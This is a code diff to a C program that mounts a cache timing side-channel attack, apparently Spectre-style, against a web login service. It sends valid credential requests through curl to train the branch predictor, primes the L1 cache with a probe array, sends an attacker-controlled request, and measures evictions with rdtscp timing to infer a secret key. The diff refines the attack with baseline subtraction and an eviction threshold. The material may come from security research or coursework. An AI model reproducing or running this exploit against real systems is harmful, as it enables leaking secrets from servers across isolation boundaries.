@@ -13,8 +13,12 @@
 #define NO_LINES (WAYS * SETS)
 
 #define INDEXES_PER_LINE (LINE_SIZE / sizeof(int))
-#define TRAINING_REPS 100
 #define PROBE_ARR_SIZE (L1_SIZE/sizeof(int))
+
+#define TRAINING_REPS 100
+#define ATTACK_RUNS 100.0
+
+#define EVICTION_THRESHOLD 10
 // ADDRESS SECRET_KEY[0] -> 0x555555556008
 
 unsigned int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
@@ -30,8 +34,8 @@ int main(int argc, char* argv[]) {
     if (argc == 2){
         attack_id = argv[1]; 
     }
-    char attack_data[42];
-    snprintf(attack_data, 42, "username=user1&password=password&id=%s", attack_id);
+    char attack_data[64];
+    snprintf(attack_data, 64, "username=user1&password=password&id=%s", attack_id);
     char *valid_data = "username=user1&password=password&id=2";
 
     // set up curl 
@@ -44,23 +48,23 @@ int main(int argc, char* argv[]) {
 
 
     int count[SETS] = {0}; // records sets that have been touched
+    int baseline[SETS] = {0};    
     
-    int loops = 10;
+    int loops = ATTACK_RUNS;
     while (loops > 0){
         // Train BP
         for(int i = 0; i < TRAINING_REPS; i++){
+                prime_cache(); // prime L1 with probe array
+
                 make_request(valid_data); // send valid credentials
+
+                // adds to count to calculate baseline
+                check_cache_presence(baseline);
             }
         
-        // Prime L1 cache
-        // just need to hit each cache line once (so will skip indexes on the same line)
-        for (int j = 0; j < 5; j++){
-            // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
-            for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
-                probe_array[i] = 0; 
-            }
-        }
         
+        prime_cache(); // prime L1 with probe array
+
         _mm_mfence(); // wait for prime to compelte before sending bad request
         // cache check 
         make_request(attack_data);
@@ -69,18 +73,32 @@ int main(int argc, char* argv[]) {
         check_cache_presence(count);
         loops --;
     }
-    for (int i = 0; i < SETS; i ++){
-        if (count[i] > 0){
-            printf("Set %d: %d\n", i, count[i]);
+
+    printf("\n===== Eviction Difs =====\n");
+    for (int i = 0; i < SETS; i++) {
+        // get avg misses for each attack run
+        float avg_baseline = baseline[i] / ATTACK_RUNS;
+    
+        float diff = (float)count[i] - avg_baseline;
+
+        // if attack increased eviction more than threshold
+        if (diff > EVICTION_THRESHOLD) { 
+            printf("Set %d: +%.2f\n", i, diff); // print diff
         }
-    }
-
-
+}
     curl_easy_cleanup(curl_handle);
-
     return 0;
 }
-
+void prime_cache(){
+    // Prime L1 cache
+    // just need to hit each cache line once (so will skip indexes on the same line)
+    for (int j = 0; j < 5; j++){
+        // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
+        for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
+            probe_array[i] = 0; 
+        }
+    }
+}
 
 void check_cache_presence(int *count){
     int present = 0;
@@ -117,17 +135,16 @@ uint64_t cache_threshold(){
     uint64_t min = UINT64_MAX;
     uint64_t max = 0;
     unsigned int pid;
-    volatile int junk; 
 
     for (int i = 0; i < 1000; i++){
-        junk = test_data;
-        junk = test_data;
+        pid = test_data;
+        pid = test_data;
 
         _mm_lfence();
         t1 = __rdtscp(&pid);
         _mm_lfence();
 
-        junk = test_data;
+        pid = test_data;
 
         _mm_lfence();
         t2 = __rdtscp(&pid);
@@ -158,7 +175,6 @@ uint64_t cache_threshold(){
         if (min > time){
             min = time;
         }
-        //printf("miss Time: %ld\n", time, junk);
     }
     printf("fastest miss: %ld\nslowest hit: %ld\n", min, max);
     uint64_t threshold = (min + max)/2;
